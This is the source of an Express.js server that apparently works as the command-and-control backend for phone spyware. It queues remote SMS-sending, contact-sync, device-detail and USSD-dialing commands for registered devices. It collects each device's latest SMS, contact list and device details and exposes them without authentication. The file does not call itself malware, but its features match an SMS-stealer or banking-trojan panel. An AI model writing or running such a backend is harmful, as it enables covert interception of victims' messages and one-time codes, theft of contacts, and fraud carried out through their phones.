const express = require("express");
const cors = require("cors");
const { v4: uuidv4 } = require("uuid");

const app = express();
app.use(cors());
app.use(express.json());

/**
 * In-memory store
 */
const devices = {};          // deviceId -> { deviceId, model, registeredAt }
const commands = {};         // deviceId -> [ { id, type, number?, message?, code?, simSlot? } ]
const smsData = {};          // deviceId -> latest SMS
const contactsDB = {};       // deviceId -> contacts
const deviceDetailsDB = {};  // deviceId -> device info

// ------------------ Device Registration ------------------
app.post("/register", (req, res) => {
    const { deviceId, model } = req.body;
    if (!deviceId)
        return res.status(400).json({ success: false, error: "deviceId required" });

    devices[deviceId] = {
        deviceId,
        model: model || "unknown",
        registeredAt: new Date()
    };

    if (!commands[deviceId]) commands[deviceId] = [];
    if (!smsData[deviceId]) smsData[deviceId] = [];
    if (!contactsDB[deviceId]) contactsDB[deviceId] = [];
    if (!deviceDetailsDB[deviceId]) deviceDetailsDB[deviceId] = {};

    res.json({ success: true });
});

// ------------------ Fetch all devices ------------------
app.get("/fetch", (req, res) => {
    res.json(Object.values(devices));
});

// ------------------ Send SMS command to device ------------------
app.post("/sendsms", (req, res) => {
    const { deviceId, number, message } = req.body;
    if (!devices[deviceId])
        return res.status(404).json({ success: false, error: "Device not found" });

    const cmd = { id: uuidv4(), type: "SMS", number, message };
    commands[deviceId].push(cmd);
    res.json({ success: true, command: cmd });
});

// ------------------ Trigger CONTACT SYNC ------------------
app.post("/contact", (req, res) => {
    const { deviceId } = req.body;
    if (!devices[deviceId])
        return res.status(404).json({ success: false, error: "Device not found" });

    const cmd = { id: uuidv4(), type: "CONTACT_SYNC" };
    commands[deviceId].push(cmd);
    res.json({ success: true, status: "queued" });
});

// ------------------ Trigger DEVICE DETAILS ------------------
app.post("/devicedetails", (req, res) => {
    const { deviceId } = req.body;
    if (!devices[deviceId])
        return res.status(404).json({ success: false, error: "Device not found" });

    const cmd = { id: uuidv4(), type: "DEVICE_DETAILS" };
    commands[deviceId].push(cmd);
    res.json({ success: true, status: "queued" });
});

// ------------------ Trigger USSD ------------------
app.post("/testussd", (req, res) => {
    const { deviceId, code, simSlot } = req.body;

    if (!devices[deviceId])
        return res.status(404).json({ success: false });

    commands[deviceId].push({
        id: uuidv4(),
        type: "USSD",
        code,
        simSlot: simSlot || 0
    });

    res.json({ success: true, status: "queued" });
});

// ------------------ Device polls for commands ------------------
app.get("/commands", (req, res) => {
    const { deviceId } = req.query;
    if (!deviceId || !commands[deviceId]) return res.json([]);
    const pending = commands[deviceId];
    commands[deviceId] = []; // clear after fetch
    res.json(pending);
});

// ------------------ Device sends latest SMS ------------------
app.post("/smsread", (req, res) => {
    const { deviceId, sms } = req.body;
    if (!deviceId || !sms)
        return res.status(400).json({ success: false, error: "deviceId or sms missing" });

    smsData[deviceId] = sms; // store latest SMS
    res.json({ success: true });
});

// ------------------ Fetch latest SMS of a device ------------------
app.post("/get-sms", (req, res) => {
    const { deviceId } = req.body;
    if (!deviceId)
        return res.status(400).json({ success: false, error: "deviceId required" });

    res.json(smsData[deviceId] || []);
});

// ------------------ Upload contacts from device ------------------
app.post("/contacts-upload", (req, res) => {
    const { deviceId, contacts } = req.body;
    if (!deviceId || !contacts)
        return res.status(400).json({ success: false, error: "deviceId or contacts missing" });

    contactsDB[deviceId] = contacts;
    res.json({ success: true, total: contacts.length });
});

// ------------------ Fetch contacts of a device ------------------
app.get("/contacts/:deviceId", (req, res) => {
    const { deviceId } = req.params;
    res.json(contactsDB[deviceId] || []);
});

// ------------------ Device uploads device details ------------------
app.post("/device-details-upload", (req, res) => {
    const { deviceId, ...details } = req.body;
    if (!deviceId)
        return res.status(400).json({ success: false, error: "deviceId required" });

    deviceDetailsDB[deviceId] = details;
    res.json({ success: true });
});

// ------------------ Fetch device details ------------------
app.get("/device-details/:deviceId", (req, res) => {
    const { deviceId } = req.params;
    res.json(deviceDetailsDB[deviceId] || {});
});

// ------------------ Start server ------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
